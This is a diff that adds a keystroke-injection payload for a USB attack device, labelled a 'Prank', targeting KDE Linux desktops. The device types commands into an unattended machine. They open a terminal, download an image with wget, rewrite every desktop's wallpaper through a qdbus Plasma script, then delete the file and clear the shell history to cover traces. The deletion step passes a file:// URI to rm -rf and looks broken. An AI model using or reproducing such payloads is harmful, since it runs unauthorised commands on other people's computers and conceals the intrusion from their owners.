@@ -1,0 +1,36 @@
+###########################################
+#                                         #
+# Title        : Change Desktop Wallpaper #
+# Author       : Aleff                    #
+# Version      : 1.0                      #
+# Category     : Prank                    #
+# Target       : Linux (KDE based)        #
+#                                         #
+###########################################
+
+ATTACKMODE HID
+
+# Requirements:
+#  - Internet Connection
+
+# VARIABLES
+# - 1) IMAGE_LINK with your image link i.e. 'example.com/IMAGE_NAME'
+IMAGE_LINK='example.com'
+# - 2) example.jpg with the image path, i.e. if the path is '/home/USERNAME/example.jpg' you must write 'file:///home/USERNAME/example.jpg'
+IMAGE_PATH='file:///home/USERNAME/example.jpg'
+
+QUACK DELAY 1000
+QUACK CTRL-ALT t
+QUACK DELAY 2000
+QUACK STRING wget $IMAGE_LINK
+QUACK ENTER
+
+# It depends by the Internet Connection
+QUACK DELAY 2000
+
+QUACK STRING qdbus org.kde.plasmashell /PlasmaShell org.kde.PlasmaShell.evaluateScript \"var allDesktops = desktops();for (i=0;i<allDesktops.length;i++) {d = allDesktops[i]; d.wallpaperPlugin = 'org.kde.image';d.currentConfigGroup = Array('Wallpaper', 'org.kde.image', 'General');d.writeConfig('Image', '$IMAGE_PATH')}\"
+QUACK ENTER
+QUACK DELAY 1000
+
+QUACK STRING rm -rf $IMAGE_PATH; history -c; exit;
+QUACK ENTER
